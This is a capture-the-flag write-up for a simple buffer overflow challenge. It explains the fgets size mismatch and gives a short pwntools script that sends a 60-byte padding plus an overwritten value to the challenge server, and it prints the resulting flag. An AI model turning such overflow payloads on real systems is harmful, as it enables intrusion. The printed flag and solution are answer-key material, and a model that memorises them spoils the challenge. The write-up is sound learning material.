# Description:

Tell me your favorite number and I might give you the flag ;).

```
nc chall.pwnoh.io 13372
```

# Solution
 char buf[50] has 50 byte but fgets(buf, 0x50, stdin) can  read 80 byte, so that is buffer overflow. We just need to calculate or try, a suitable offset number to get the flag.
```
from pwn import *

#p = process('./buffer')
#elf = ELF('./buffer')
p = remote('chall.pwnoh.io', 13372)
res = p.recvuntil(':')
print(res)
offset = 60
payload = b'a' * offset + p64(0x45454545)
p.sendline(payload)

p.interactive()
```

> bctf{wHy_WriTe_OveR_mY_V@lUeS}
